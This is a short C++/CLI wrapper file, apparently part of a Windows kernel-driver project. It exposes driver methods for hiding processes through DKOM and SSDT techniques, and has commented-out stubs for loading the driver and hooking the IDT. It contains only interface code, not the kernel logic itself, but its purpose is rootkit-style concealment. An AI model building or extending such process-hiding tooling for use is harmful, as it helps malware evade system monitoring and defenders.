// This is the main DLL file.

#include "CliWrapperDriver.hpp"

using namespace wrapper;

/*
** ~ Constructor / Destructor:
*/
CliWrapperDriver::CliWrapperDriver(String ^filename, String ^displayName, String^ deviceName)
{
	std::string	filenameStd;
	std::string	displayNameStd;
	std::string	deviceNameStd;

	filenameStd = conversion::convertStringToStlString(filename);
	displayNameStd = conversion::convertStringToStlString(displayName);
	deviceNameStd = conversion::convertStringToStlString(deviceName);
	_driver = CDriverNew(filenameStd, displayNameStd, deviceNameStd);
}

CliWrapperDriver::~CliWrapperDriver()
{
	CDriverDelete(_driver);
}

/*
** ~ Main methods:
*/
//int	CliWrapperDriver::LoadDriver()
//{
//	return (_driver->LoadDriver());
//}
//
//int	CliWrapperDriver::UnloadDriver()
//{
//	return (_driver->UnloadDriver());
//}


/*
** ~ Hide processes:
*/
int	CliWrapperDriver::DKOMHideProcess(String^ pid)
{
	std::string str = conversion::convertStringToStlString(pid);
	return (_driver->DKOMHideProcess(str));
}

int	CliWrapperDriver::SSDTHideProcess(String^ name)
{
	std::string str = conversion::convertStringToStlString(name);
	return (_driver->SSDTHideProcess(str));
}

/*
** ~ Hook methods:
*/
//int	CliWrapperDriver::HookIDT(String^ nInt)
//{
//	std::string str = conversion::convertStringToStlString(nInt);
//	return (_driver->HookIDT(str));
//}
